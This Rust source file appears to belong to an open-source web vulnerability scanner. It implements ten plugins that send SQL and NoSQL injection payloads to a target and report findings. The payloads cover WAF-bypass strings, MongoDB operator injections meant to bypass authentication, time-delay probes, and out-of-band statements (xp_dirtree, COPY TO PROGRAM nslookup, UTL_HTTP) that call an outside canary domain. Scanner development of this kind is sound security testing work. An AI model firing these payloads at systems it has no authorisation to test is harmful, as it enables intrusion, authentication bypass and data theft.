/// Advanced SQL Injection Scanner
///
/// Techniques implemented:
///   1.  Error-based           — DB-specific syntax errors with verbose messages
///   2.  Boolean-blind         — compare true/false page differences (content length + hash)
///   3.  Time-based blind      — SLEEP/WAITFOR/pg_sleep/benchmark timing oracle
///   4.  UNION-based           — column-count probing + data extraction skeleton
///   5.  Stacked queries       — ; separator with secondary statement
///   6.  Out-of-band (OOB)     — DNS/HTTP callback canary payload (detect only)
///   7.  Second-order          — store payload then trigger (POST + GET round-trip)
///   8.  WAF bypass            — comment, case, encoding, whitespace variants
///   9.  NoSQL injection       — MongoDB operator injection ($where, $ne, $gt)
///  10.  DB fingerprinting     — identify MySQL / PostgreSQL / MSSQL / Oracle / SQLite
use std::time::{Duration, Instant};

use async_trait::async_trait;

use crate::active::{build_injection_urls_adv, get_body, timed_get, ScanPlugin};
use crate::types::{DiscoveredUrl, Finding, Severity};

// ─────────────────────────────────────────────────────────────────────────────
// 1. Error-based (extended DB coverage)
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliErrorPlugin;

#[async_trait]
impl ScanPlugin for SqliErrorPlugin {
    fn name(&self) -> &str {
        "sqli-error"
    }
    fn description(&self) -> &str {
        "SQLi error-based — extended DB error signatures (MySQL/PG/MSSQL/Oracle/SQLite)"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        let payloads: &[(&str, &[&str])] = &[
            // Generic quote
            (
                "'",
                &[
                    "You have an error in your SQL syntax",
                    "mysql_fetch",
                    "mysql_num_rows",
                    "com.mysql.jdbc",
                ],
            ),
            // PostgreSQL
            (
                "'",
                &[
                    "pg_query()",
                    "PSQLException",
                    "unterminated quoted string",
                    "syntax error at or near",
                    "ERROR:  syntax error",
                ],
            ),
            // MSSQL
            (
                "'",
                &[
                    "Unclosed quotation mark after the character string",
                    "Microsoft OLE DB Provider for SQL Server",
                    "Incorrect syntax near",
                    "SqlException",
                    "System.Data.SqlClient",
                ],
            ),
            // Oracle
            (
                "'",
                &[
                    "ORA-00907",
                    "ORA-00933",
                    "ORA-00942",
                    "ORA-01722",
                    "oracle.jdbc",
                ],
            ),
            // SQLite
            (
                "'",
                &[
                    "SQLite3::query",
                    "sqlite3.OperationalError",
                    "no such column",
                    "unrecognized token",
                ],
            ),
            // Extended triggers
            ("1/0", &["division by zero", "divide by zero", "ORA-01476"]),
            ("'||'", &["ORA-", "PostgreSQL", "syntax error"]),
            ("1 EXEC xp_", &["xp_cmdshell", "xp_regread", "xp_enumdsn"]),
            (
                r#"' AND extractvalue(1,concat(0x7e,version()))-- -"#,
                &["XPATH syntax error", "~5.", "~8."],
            ),
            (
                r#"' AND (SELECT * FROM (SELECT(SLEEP(0)))a)-- -"#,
                &["syntax", "error"],
            ),
        ];

        for (payload, signatures) in payloads {
            let variants = build_injection_urls_adv(target, payload);
            for (param, url) in variants {
                if let Some((_, body)) = get_body(client, &url).await {
                    let bl = body.to_lowercase();
                    for sig in *signatures {
                        if bl.contains(&sig.to_lowercase()) {
                            return vec![
                                Finding::new(
                                    "SQL Injection — Error-Based",
                                    Severity::Critical,
                                    &target.url,
                                    "The server returns a verbose database error when a malformed SQL payload is injected, confirming SQL injection.",
                                    "Use parameterized queries. Suppress database errors in production responses.",
                                    "active/sqli-error",
                                )
                                .with_parameter(&param)
                                .with_evidence(format!("Payload: `{}` → DB error signature: `{}`", payload, sig))
                                .with_cwe(89)
                                .with_owasp("A03:2021 – Injection"),
                            ];
                        }
                    }
                }
            }
        }
        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 2. Boolean-blind
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliBooleanPlugin;

#[async_trait]
impl ScanPlugin for SqliBooleanPlugin {
    fn name(&self) -> &str {
        "sqli-boolean"
    }
    fn description(&self) -> &str {
        "SQLi boolean-blind — compare TRUE/FALSE page differences"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // Pairs: (true_payload, false_payload)
        let pairs: &[(&str, &str)] = &[
            ("1 AND 1=1", "1 AND 1=2"),
            ("1' AND '1'='1", "1' AND '1'='2"),
            ("1 AND 1=1-- -", "1 AND 1=2-- -"),
            ("' OR 1=1-- -", "' OR 1=2-- -"),
            // MySQL specific
            ("1 AND (SELECT 1)=1", "1 AND (SELECT 1)=0"),
            // PG
            ("1 AND TRUE", "1 AND FALSE"),
            // MSSQL
            ("1 AND 1=CONVERT(int,'1')", "1 AND 1=CONVERT(int,'A')"),
        ];

        for (true_pl, false_pl) in pairs {
            let true_variants = build_injection_urls_adv(target, true_pl);
            let false_variants = build_injection_urls_adv(target, false_pl);

            for ((param, true_url), (_, false_url)) in
                true_variants.iter().zip(false_variants.iter())
            {
                let baseline = get_body(client, &target.url)
                    .await
                    .map(|(_, b)| b.len())
                    .unwrap_or(0);
                let true_len = get_body(client, true_url)
                    .await
                    .map(|(_, b)| b.len())
                    .unwrap_or(0);
                let false_len = get_body(client, false_url)
                    .await
                    .map(|(_, b)| b.len())
                    .unwrap_or(0);

                // Heuristic: true response ≈ baseline, false response meaningfully different
                let baseline_matches_true = (true_len as i64 - baseline as i64).abs() < 50;
                let false_differs = (false_len as i64 - true_len as i64).abs() > 20;

                if baseline_matches_true && false_differs && true_len > 0 && false_len > 0 {
                    return vec![
                        Finding::new(
                            "SQL Injection — Boolean-Blind",
                            Severity::Critical,
                            &target.url,
                            "The application returns different content for TRUE vs FALSE SQL conditions, indicating blind SQL injection. An attacker can enumerate the entire database bit-by-bit.",
                            "Use parameterized queries. The vulnerability is exploitable even without visible error messages.",
                            "active/sqli-boolean",
                        )
                        .with_parameter(param)
                        .with_evidence(format!(
                            "TRUE payload `{}` → {}B  |  FALSE payload `{}` → {}B  |  baseline → {}B",
                            true_pl, true_len, false_pl, false_len, baseline
                        ))
                        .with_cwe(89)
                        .with_owasp("A03:2021 – Injection"),
                    ];
                }
            }
        }
        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 3. Time-based blind
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliTimePlugin;

const SLEEP_SECS: u64 = 5;
const TIMING_THRESHOLD_MS: u64 = 4000; // confirm if response delayed ≥4s

#[async_trait]
impl ScanPlugin for SqliTimePlugin {
    fn name(&self) -> &str {
        "sqli-time"
    }
    fn description(&self) -> &str {
        "SQLi time-based blind — SLEEP/WAITFOR/pg_sleep timing oracle"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // (payload, db_label)
        let payloads: &[(&str, &str)] = &[
            // MySQL
            (&format!("' AND SLEEP({})-- -", SLEEP_SECS), "MySQL"),
            (&format!("1 AND SLEEP({})", SLEEP_SECS), "MySQL"),
            // PostgreSQL
            (
                &format!("'; SELECT pg_sleep({})-- -", SLEEP_SECS),
                "PostgreSQL",
            ),
            (&format!("1; SELECT pg_sleep({})", SLEEP_SECS), "PostgreSQL"),
            // MSSQL
            (
                &format!("'; WAITFOR DELAY '0:0:{}'-- -", SLEEP_SECS),
                "MSSQL",
            ),
            (&format!("1; WAITFOR DELAY '0:0:{}'", SLEEP_SECS), "MSSQL"),
            // Oracle (heavy CPU, no sleep — but detectable via heavy query)
            (
                "1 AND 1=(SELECT COUNT(*) FROM ALL_OBJECTS WHERE ROWNUM<100000)",
                "Oracle",
            ),
            // SQLite
            (&format!("1 AND randomblob({})", 100_000_000u64), "SQLite"),
        ];

        // We need a client with a longer timeout for sleep detection
        let long_client = reqwest::Client::builder()
            .timeout(Duration::from_secs(SLEEP_SECS + 4))
            .build()
            .unwrap_or_else(|_| client.clone());

        // Baseline latency
        let baseline_ms = {
            let t = Instant::now();
            let _ = long_client.get(&target.url).send().await;
            t.elapsed().as_millis() as u64
        };

        for (payload, db_label) in payloads {
            let variants = build_injection_urls_adv(target, payload);
            for (param, url) in variants {
                let (elapsed_ms, ok) = timed_get(&long_client, &url).await;
                if ok
                    && elapsed_ms >= TIMING_THRESHOLD_MS
                    && elapsed_ms >= baseline_ms + TIMING_THRESHOLD_MS
                {
                    return vec![
                        Finding::new(
                            "SQL Injection — Time-Based Blind",
                            Severity::Critical,
                            &target.url,
                            format!(
                                "A {}-second delay was triggered via a {} time-delay payload, confirming blind SQL injection. The database appears to be {}.",
                                SLEEP_SECS, elapsed_ms, db_label
                            ),
                            "Use parameterized queries. Time-based injection is fully exploitable for data exfiltration via tools like sqlmap.",
                            "active/sqli-time",
                        )
                        .with_parameter(&param)
                        .with_evidence(format!(
                            "Payload: `{}` (db={}) → response in {}ms (baseline {}ms)",
                            payload, db_label, elapsed_ms, baseline_ms
                        ))
                        .with_cwe(89)
                        .with_owasp("A03:2021 – Injection"),
                    ];
                }
            }
        }
        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 4. UNION-based
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliUnionPlugin;

#[async_trait]
impl ScanPlugin for SqliUnionPlugin {
    fn name(&self) -> &str {
        "sqli-union"
    }
    fn description(&self) -> &str {
        "SQLi UNION-based — column count probing + reflection detection"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // Probe column counts 1–10; look for our canary in the response
        let canary = "rustzap9x";

        for col_count in 1usize..=10 {
            // Build UNION SELECT with NULLs except one position replaced with canary string
            for canary_pos in 0..col_count {
                let cols: Vec<String> = (0..col_count)
                    .map(|i| {
                        if i == canary_pos {
                            format!("'{}'", canary)
                        } else {
                            "NULL".to_string()
                        }
                    })
                    .collect();

                let payload = format!("' UNION SELECT {}-- -", cols.join(","));
                let variants = build_injection_urls_adv(target, &payload);

                for (param, url) in variants {
                    if let Some((_, body)) = get_body(client, &url).await {
                        if body.contains(canary) {
                            return vec![
                                Finding::new(
                                    "SQL Injection — UNION-Based",
                                    Severity::Critical,
                                    &target.url,
                                    format!(
                                        "UNION-based SQL injection confirmed. The query has {} column(s) and position {} is reflected. An attacker can extract arbitrary data from the database.",
                                        col_count, canary_pos + 1
                                    ),
                                    "Use parameterized queries. UNION injection allows full database read access including credentials.",
                                    "active/sqli-union",
                                )
                                .with_parameter(&param)
                                .with_evidence(format!(
                                    "UNION SELECT with {} cols, canary at pos {} reflected in response. Payload: `{}`",
                                    col_count, canary_pos + 1, &payload[..payload.len().min(120)]
                                ))
                                .with_cwe(89)
                                .with_owasp("A03:2021 – Injection"),
                            ];
                        }
                    }
                }
            }
        }
        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 5. Stacked queries
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliStackedPlugin;

#[async_trait]
impl ScanPlugin for SqliStackedPlugin {
    fn name(&self) -> &str {
        "sqli-stacked"
    }
    fn description(&self) -> &str {
        "SQLi stacked queries — semicolon-separated secondary statement detection"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // Use a time-delay in the stacked statement as an oracle
        let payloads: &[(&str, &str)] = &[
            (";SELECT SLEEP(3)-- -", "MySQL stacked + sleep"),
            (";SELECT pg_sleep(3)-- -", "PostgreSQL stacked + sleep"),
            (";WAITFOR DELAY '0:0:3'-- -", "MSSQL stacked + waitfor"),
            // Trigger an error in the second statement (detectable without timing)
            (";SELECT 1/0-- -", "stacked + division-by-zero"),
            (";INVALID_STATEMENT-- -", "stacked + syntax error"),
        ];

        let long_client = reqwest::Client::builder()
            .timeout(Duration::from_secs(8))
            .build()
            .unwrap_or_else(|_| client.clone());

        let baseline_ms = {
            let t = Instant::now();
            let _ = long_client.get(&target.url).send().await;
            t.elapsed().as_millis() as u64
        };

        for (payload, label) in payloads {
            let variants = build_injection_urls_adv(target, payload);
            for (param, url) in variants {
                let (elapsed_ms, ok) = timed_get(&long_client, &url).await;
                if ok && elapsed_ms > baseline_ms + 2500 {
                    return vec![
                        Finding::new(
                            "SQL Injection — Stacked Queries",
                            Severity::Critical,
                            &target.url,
                            "The database driver executes multiple semicolon-separated statements. This allows an attacker to execute arbitrary SQL, including UPDATE, DELETE, INSERT, or stored procedure calls.",
                            "Use parameterized queries. Disable multi-statement execution in your database connector.",
                            "active/sqli-stacked",
                        )
                        .with_parameter(&param)
                        .with_evidence(format!(
                            "Technique: {} — delayed {}ms (baseline {}ms). Payload: `{}`",
                            label, elapsed_ms, baseline_ms, payload
                        ))
                        .with_cwe(89)
                        .with_owasp("A03:2021 – Injection"),
                    ];
                }
            }
        }
        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 6. Out-of-Band (OOB) — detection only, no real callback server
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliOobPlugin;

#[async_trait]
impl ScanPlugin for SqliOobPlugin {
    fn name(&self) -> &str {
        "sqli-oob"
    }
    fn description(&self) -> &str {
        "SQLi OOB — DNS/HTTP callback payload injection (detect only, no listener)"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // We inject OOB payloads and look for indicators in the response (error suppression,
        // timing change, or explicit DNS attempt acknowledgement).
        // In a real tool you'd pair this with a Burp Collaborator / interactsh server.
        let canary_domain = "rustzap-oob-canary.example.com";

        let payloads: &[(&str, &str)] = &[
            // MySQL - LOAD_FILE via UNC (Windows)
            (
                &format!("' AND LOAD_FILE('\\\\\\\\{}\\\\foo')-- -", canary_domain),
                "MySQL UNC/LOAD_FILE",
            ),
            // MSSQL - xp_dirtree DNS lookup
            (
                &format!(
                    "'; EXEC master..xp_dirtree '\\\\{}\\foo'-- -",
                    canary_domain
                ),
                "MSSQL xp_dirtree",
            ),
            // PostgreSQL COPY TO
            (
                &format!(
                    "'; COPY (SELECT '') TO PROGRAM 'nslookup {}'-- -",
                    canary_domain
                ),
                "PostgreSQL COPY TO PROGRAM",
            ),
            // Oracle UTL_HTTP
            (
                &format!(
                    "' UNION SELECT UTL_HTTP.REQUEST('http://{}') FROM DUAL-- -",
                    canary_domain
                ),
                "Oracle UTL_HTTP",
            ),
        ];

        for (payload, label) in payloads {
            let variants = build_injection_urls_adv(target, payload);
            for (param, url) in variants {
                if let Some((status, body)) = get_body(client, &url).await {
                    let bl = body.to_lowercase();
                    // Heuristic: if the OOB statement ran without an "invalid syntax" error,
                    // but the normal functionality is broken (500 or different content), it may have fired.
                    // We flag as informational/potential.
                    let looks_accepted = !bl.contains("syntax error")
                        && !bl.contains("you have an error")
                        && status != 200;

                    if looks_accepted {
                        return vec![
                            Finding::new(
                                "SQL Injection — Potential Out-of-Band (OOB)",
                                Severity::High,
                                &target.url,
                                format!(
                                    "An OOB SQL payload ({}) did not produce a visible syntax error and caused an abnormal response (HTTP {}). Confirm with an interactsh/Burp Collaborator listener.",
                                    label, status
                                ),
                                "Deploy an out-of-band listener (Burp Collaborator, interactsh) to confirm. If confirmed, patch immediately — OOB exfiltration bypasses all output filters.",
                                "active/sqli-oob",
                            )
                            .with_parameter(&param)
                            .with_evidence(format!(
                                "Payload: `{}` → HTTP {} (no syntax error in body). OOB canary: {}",
                                &payload[..payload.len().min(100)], status, canary_domain
                            ))
                            .with_cwe(89)
                            .with_owasp("A03:2021 – Injection"),
                        ];
                    }
                }
            }
        }
        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 7. Second-order SQLi
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliSecondOrderPlugin;

#[async_trait]
impl ScanPlugin for SqliSecondOrderPlugin {
    fn name(&self) -> &str {
        "sqli-second-order"
    }
    fn description(&self) -> &str {
        "SQLi second-order — store payload then trigger via a different endpoint"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // Only attempt on POST endpoints that look like registration/profile update
        if target.method != "POST" {
            return vec![];
        }

        let triggers_second_order = target.url.contains("register")
            || target.url.contains("signup")
            || target.url.contains("profile")
            || target.url.contains("update")
            || target.url.contains("user");

        if !triggers_second_order {
            return vec![];
        }

        // We store a payload that would only error when retrieved later
        let stored_payload = "rustzap' OR '1'='1";

        // Build form body with payload in each parameter
        for param in &target.parameters {
            let form_body: Vec<(&str, &str)> = target
                .parameters
                .iter()
                .map(|p| {
                    let val: &str = if p == param {
                        stored_payload
                    } else {
                        "rustzap_test"
                    };
                    (p.as_str(), val)
                })
                .collect();

            // POST the payload
            let post_resp = client
                .post(&target.url)
                .form(&form_body)
                .timeout(Duration::from_secs(8))
                .send()
                .await;

            if let Ok(r) = post_resp {
                let stored_status = r.status().as_u16();
                // If stored without error, warn that second-order may be present
                if stored_status < 400 {
                    return vec![
                        Finding::new(
                            "Potential Second-Order SQL Injection",
                            Severity::High,
                            &target.url,
                            "A SQL injection payload was accepted by the server without sanitization. If this value is later used in a SQL query (e.g. during login or profile retrieval), second-order SQL injection may be possible.",
                            "Sanitize and parameterize ALL SQL usage of stored user data, not just at initial input. Use ORMs with parameterized queries throughout.",
                            "active/sqli-second-order",
                        )
                        .with_parameter(param)
                        .with_evidence(format!(
                            "Payload `{}` stored via POST without error (HTTP {}). Manual follow-up required to confirm trigger.",
                            stored_payload, stored_status
                        ))
                        .with_cwe(89)
                        .with_owasp("A03:2021 – Injection"),
                    ];
                }
            }
        }
        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 8. WAF bypass variants
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliWafBypassPlugin;

#[async_trait]
impl ScanPlugin for SqliWafBypassPlugin {
    fn name(&self) -> &str {
        "sqli-waf-bypass"
    }
    fn description(&self) -> &str {
        "SQLi WAF bypass — comment injection, case variation, encoding, whitespace tricks"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // These are WAF-bypass variants of classic error/boolean payloads
        let payloads: &[(&str, &[&str])] = &[
            // Inline comment obfuscation
            (
                "'/**/OR/**/1=1--",
                &["error", "syntax", "mysql", "pg_query"],
            ),
            ("'/*!50000OR*/1=1--", &["error", "syntax", "mysql"]),
            // Case variation
            ("' oR '1'='1", &["error", "syntax", "warning"]),
            ("' Or 1=1--", &["error", "syntax"]),
            // URL double-encoding
            ("%27%20OR%201%3D1--", &["error", "syntax", "you have"]),
            // Null-byte injection (some WAFs stop at null byte)
            ("'\x00 OR 1=1--", &["error", "syntax", "mysql"]),
            // Whitespace alternatives (tab, newline)
            ("'\tOR\t1=1--", &["error", "syntax"]),
            ("'\nOR\n1=1--", &["error", "syntax"]),
            // Scientific notation
            ("1e0 UNION SELECT 1--", &["error", "syntax", "union"]),
            // Hex encoding of keyword
            ("' OR 0x313d31--", &["error", "syntax"]),
            // MySQL specific version comment
            ("' /*!UNION*/ SELECT 1--", &["error", "syntax"]),
            // HPP (HTTP parameter pollution) — single value side
            ("1' AND 0x313=0x313--", &["error", "syntax"]),
        ];

        for (payload, sigs) in payloads {
            let variants = build_injection_urls_adv(target, payload);
            for (param, url) in variants {
                if let Some((_, body)) = get_body(client, &url).await {
                    let bl = body.to_lowercase();
                    for sig in *sigs {
                        if bl.contains(sig) {
                            return vec![
                                Finding::new(
                                    "SQL Injection — WAF Bypass",
                                    Severity::Critical,
                                    &target.url,
                                    "SQL injection was detected using a WAF bypass technique (comment obfuscation, encoding, or case variation). A WAF may be present but can be evaded.",
                                    "Fix the underlying parameterization — WAF rules alone are not sufficient protection against SQLi.",
                                    "active/sqli-waf-bypass",
                                )
                                .with_parameter(&param)
                                .with_evidence(format!(
                                    "Bypass payload: `{}` → DB signature: `{}`",
                                    payload, sig
                                ))
                                .with_cwe(89)
                                .with_owasp("A03:2021 – Injection"),
                            ];
                        }
                    }
                }
            }
        }
        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 9. NoSQL injection (MongoDB)
// ─────────────────────────────────────────────────────────────────────────────

pub struct NoSqlInjectionPlugin;

#[async_trait]
impl ScanPlugin for NoSqlInjectionPlugin {
    fn name(&self) -> &str {
        "nosql"
    }
    fn description(&self) -> &str {
        "NoSQL injection — MongoDB operator injection ($ne, $gt, $where, $regex)"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // For JSON body POST endpoints
        if target.method == "POST" {
            let json_payloads: &[(&str, &str)] = &[
                // Auth bypass: {"username": {"$ne": ""}, "password": {"$ne": ""}}
                (r#"{"$ne": ""}"#, "$ne operator"),
                (r#"{"$gt": ""}"#, "$gt operator"),
                (r#"{"$regex": ".*"}"#, "$regex wildcard"),
                (r#"{"$where": "1==1"}"#, "$where JS injection"),
                (r#"{"$in": ["admin", "root", "user"]}"#, "$in operator"),
            ];

            for param in &target.parameters {
                for (op_payload, op_label) in json_payloads {
                    // Build JSON body replacing one field with the operator object
                    let mut obj = serde_json::Map::new();
                    for p in &target.parameters {
                        if p == param {
                            if let Ok(v) = serde_json::from_str::<serde_json::Value>(op_payload) {
                                obj.insert(p.clone(), v);
                            }
                        } else {
                            obj.insert(p.clone(), serde_json::Value::String("rustzap_test".into()));
                        }
                    }

                    let body_str = serde_json::to_string(&obj).unwrap_or_default();
                    let resp = client
                        .post(&target.url)
                        .header("Content-Type", "application/json")
                        .body(body_str.clone())
                        .timeout(Duration::from_secs(8))
                        .send()
                        .await;

                    if let Ok(r) = resp {
                        let status = r.status().as_u16();
                        let body = r.text().await.unwrap_or_default();
                        let bl = body.to_lowercase();

                        // Auth bypass indicators
                        let auth_bypass = bl.contains("token")
                            || bl.contains("success")
                            || bl.contains("welcome")
                            || bl.contains("dashboard");

                        if (status == 200 || status == 302) && auth_bypass {
                            return vec![
                                Finding::new(
                                    "NoSQL Injection — MongoDB Operator Injection",
                                    Severity::Critical,
                                    &target.url,
                                    format!(
                                        "MongoDB operator injection ({}) returned a successful response suggesting authentication bypass or unauthorized data access.",
                                        op_label
                                    ),
                                    "Validate and sanitize all user input before using in MongoDB queries. Use allowlists for expected types. Never pass raw user objects as query conditions.",
                                    "active/nosql",
                                )
                                .with_parameter(param)
                                .with_evidence(format!(
                                    "Operator: {} — HTTP {} with auth/success indicator in response. Body: `{}`",
                                    op_label, status, &body[..body.len().min(80)]
                                ))
                                .with_cwe(943)
                                .with_owasp("A03:2021 – Injection"),
                            ];
                        }
                    }
                }
            }
        }

        // GET-based NoSQL: ?param[$ne]=x style
        let get_payloads: &[(&str, &str)] = &[
            ("[$ne]=rustzap_nonexistent_val", "MongoDB $ne in GET param"),
            ("[$gt]=", "MongoDB $gt in GET param"),
            ("[$regex]=.*", "MongoDB $regex in GET param"),
        ];

        if let Ok(parsed) = url::Url::parse(&target.url) {
            let params: Vec<(String, String)> = parsed
                .query_pairs()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect();

            for (key, _) in &params {
                for (suffix, label) in get_payloads {
                    let new_url = target
                        .url
                        .replace(&format!("{}=", key), &format!("{}{}", key, suffix));

                    if let Some((status, body)) = get_body(client, &new_url).await {
                        let bl = body.to_lowercase();
                        if status == 200
                            && (bl.contains("admin") || bl.contains("token") || bl.contains("user"))
                        {
                            return vec![
                                Finding::new(
                                    "NoSQL Injection — MongoDB GET Operator",
                                    Severity::High,
                                    &target.url,
                                    format!(
                                        "MongoDB query operator injected via GET parameter ({}) returned privileged data.",
                                        label
                                    ),
                                    "Validate and sanitize all query parameters. Reject unexpected object types.",
                                    "active/nosql",
                                )
                                .with_parameter(key)
                                .with_evidence(format!("Param `{}` with `{}` → HTTP 200 with privileged content", key, suffix))
                                .with_cwe(943)
                                .with_owasp("A03:2021 – Injection"),
                            ];
                        }
                    }
                }
            }
        }

        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 10. DB fingerprinting
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliFingerprintPlugin;

#[derive(Debug, Clone)]
pub enum DbType {
    MySQL,
    PostgreSQL,
    Mssql,
    Oracle,
    SQLite,
    /// Sentinel returned by callers that cannot determine the backend.
    /// Referenced by `Display` so it must stay in the enum.
    #[allow(dead_code)]
    Unknown,
}

impl std::fmt::Display for DbType {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        match self {
            DbType::MySQL => write!(f, "MySQL"),
            DbType::PostgreSQL => write!(f, "PostgreSQL"),
            DbType::Mssql => write!(f, "Microsoft SQL Server"),
            DbType::Oracle => write!(f, "Oracle"),
            DbType::SQLite => write!(f, "SQLite"),
            DbType::Unknown => write!(f, "Unknown"),
        }
    }
}

#[async_trait]
impl ScanPlugin for SqliFingerprintPlugin {
    fn name(&self) -> &str {
        "sqli-fingerprint"
    }
    fn description(&self) -> &str {
        "SQLi DB fingerprinting — identify MySQL/PostgreSQL/MSSQL/Oracle/SQLite"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // Each payload produces output only on one DB
        let fingerprints: &[(&str, DbType, &[&str])] = &[
            // MySQL: @@version, version(), INFORMATION_SCHEMA
            (
                "' AND 1=CONVERT(int,@@version)-- -",
                DbType::MySQL,
                &["mysql", "mariadb", "10.", "8.", "5.7", "5.6"],
            ),
            (
                "' UNION SELECT @@version,NULL-- -",
                DbType::MySQL,
                &["mysql", "mariadb", "10.", "8.0"],
            ),
            // PostgreSQL
            (
                "' UNION SELECT version(),NULL-- -",
                DbType::PostgreSQL,
                &["postgresql", "postgre", "pg "],
            ),
            (
                "'; SELECT current_setting('server_version')-- -",
                DbType::PostgreSQL,
                &["postgresql", "14.", "15.", "16."],
            ),
            // MSSQL
            (
                "' UNION SELECT @@version,NULL-- -",
                DbType::Mssql,
                &["microsoft sql server", "sql server 2019", "sql server 2022"],
            ),
            (
                "'; SELECT @@version-- -",
                DbType::Mssql,
                &["microsoft", "windows nt", "sql server"],
            ),
            // Oracle
            (
                "' UNION SELECT banner,NULL FROM v$version-- -",
                DbType::Oracle,
                &["oracle database", "enterprise edition", "release"],
            ),
            // SQLite
            (
                "' UNION SELECT sqlite_version(),NULL-- -",
                DbType::SQLite,
                &["3.", "sqlite"],
            ),
        ];

        for (payload, db, signatures) in fingerprints {
            let variants = build_injection_urls_adv(target, payload);
            for (param, url) in variants {
                if let Some((_, body)) = get_body(client, &url).await {
                    let bl = body.to_lowercase();
                    for sig in *signatures {
                        if bl.contains(sig) {
                            return vec![
                                Finding::new(
                                    format!("Database Fingerprinted — {}", db),
                                    Severity::Medium,
                                    &target.url,
                                    format!(
                                        "The database version was identified as {} via SQL injection. Version information aids targeted exploitation.",
                                        db
                                    ),
                                    "Suppress all database error output and version information in production responses.",
                                    "active/sqli-fingerprint",
                                )
                                .with_parameter(&param)
                                .with_evidence(format!(
                                    "DB: {} — signature `{}` found via payload `{}`",
                                    db, sig, &payload[..payload.len().min(80)]
                                ))
                                .with_cwe(200)
                                .with_owasp("A05:2021 – Security Misconfiguration"),
                            ];
                        }
                    }
                }
            }
        }
        vec![]
    }
}

/// All advanced SQLi plugins ready to merge into `ActiveScanner::new`.
pub fn plugins() -> Vec<Box<dyn ScanPlugin>> {
    vec![
        Box::new(SqliErrorPlugin),
        Box::new(SqliBooleanPlugin),
        Box::new(SqliTimePlugin),
        Box::new(SqliUnionPlugin),
        Box::new(SqliStackedPlugin),
        Box::new(SqliOobPlugin),
        Box::new(SqliSecondOrderPlugin),
        Box::new(SqliWafBypassPlugin),
        Box::new(NoSqlInjectionPlugin),
        Box::new(SqliFingerprintPlugin),
    ]
}
